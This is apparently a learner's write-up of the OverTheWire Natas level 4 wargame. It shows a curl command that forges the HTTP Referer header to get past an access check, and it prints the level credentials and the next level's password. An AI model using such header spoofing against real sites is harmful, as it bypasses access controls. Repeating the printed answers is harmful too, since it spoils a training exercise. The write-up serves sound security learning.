# Natas level 4

# Objective
Find the password from the natas4 website

# Solution Steps
1. Log into Natas website
    http://natas4.natas.labs.overthewire.org/
2. Prompted access denied due to incorrect user authentication, tried to to curl as different website
    curl -H Referer:http://natas5.natas.labs.overthewire.org/ -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org/
3. Extracted password from output
    password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

# Learned
How to change the referer of an http request using cURL 
